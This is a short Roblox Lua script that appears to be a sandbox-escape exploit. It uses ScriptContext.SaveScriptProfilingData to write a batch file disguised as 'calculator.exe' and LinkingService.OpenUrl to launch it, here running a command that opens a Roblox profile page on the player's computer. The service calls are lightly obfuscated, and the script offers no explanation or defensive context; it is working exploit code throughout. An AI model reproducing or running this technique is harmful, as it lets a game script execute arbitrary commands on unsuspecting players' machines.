local a = game;
local b = a["GetService"];
local c, d = b(a, "LinkingService"), b(a, "ScriptContext");
local e, f = c["OpenUrl"], d["SaveScriptProfilingData"];
for i = 1, 1 do
    e(c, f(d, "@echo off\n" .. string.rep("start https://www.roblox.com/users/2313744648/profile", i * 1), "calculator.exe"));
end